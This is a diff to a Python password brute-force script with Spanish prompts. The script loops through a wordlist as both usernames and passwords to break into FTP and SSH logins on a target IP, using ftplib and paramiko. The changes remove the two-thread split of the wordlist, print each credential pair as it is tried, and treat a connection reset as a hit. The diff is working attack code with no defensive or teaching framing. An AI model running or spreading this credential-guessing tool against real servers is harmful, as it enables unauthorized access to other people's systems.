@@ -9,7 +9,7 @@ if conn_serv == 2:
     Known_hosts_path = input('Ingrese la ruta hacia el archivo "Known_hosts": ')
 f_path = input("Ingrese la ruta al diccionario:\n")
 
-def FTP_conn(dicc):    
+def FTP_conn(ip, dicc):    
     for user in dicc:
         for passwd in dicc:
             conn = ftplib.FTP(ip)
@@ -31,6 +31,7 @@ def FTP_conn(dicc):
 def SSH_conn(ip, dicc, Known_hosts_path):
     for user in dicc:
         for passwd in dicc:
+            print(user, passwd)
             conn = paramiko.SSHClient()
             conn.load_host_keys(Known_hosts_path)
             conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -41,6 +42,9 @@ def SSH_conn(ip, dicc, Known_hosts_path):
                 exit()
             except paramiko.ssh_exception.AuthenticationException:
                 conn.close()
+            except ConnectionResetError:
+                print("User:", user)
+                exit()
 
 try:
     with open(f_path, "r") as f:
@@ -49,23 +53,13 @@ try:
 except Exception:
     print("Hubo un error mientras se procesaba el archivo, Compruebe que la ruta es correcta y que contiene la extensión del archivo\nSaliendo...")
     exit()
-n_word_dicc = len(words) / 2
-dicc1 = []
-dicc2 = []
 
-for index, word in enumerate(words):
-    if index <= n_word_dicc:
-        dicc1.append(word)
-    else:
-        dicc2.append(word)     
+wordlist = []
+for word in words:
+    wordlist.append(word.strip("\n"))
+words = []
 
 if conn_serv == 1:
-    t1 = threading.Thread(target=FTP_conn, args=(dicc1,))
-    t1.start()
-    t2 = threading.Thread(target=FTP_conn, args=(dicc2,))
-    t2.start()
+    FTP_conn(ip, wordlist)
 if conn_serv == 2:
-    t1 = threading.Thread(target=SSH_conn, args=(ip, dicc1, Known_hosts_path))
-    t1.start()
-    t2 = threading.Thread(target=SSH_conn, args=(ip, dicc2, Known_hosts_path))
-    t2.start()
+    SSH_conn(ip, wordlist, Known_hosts_path)
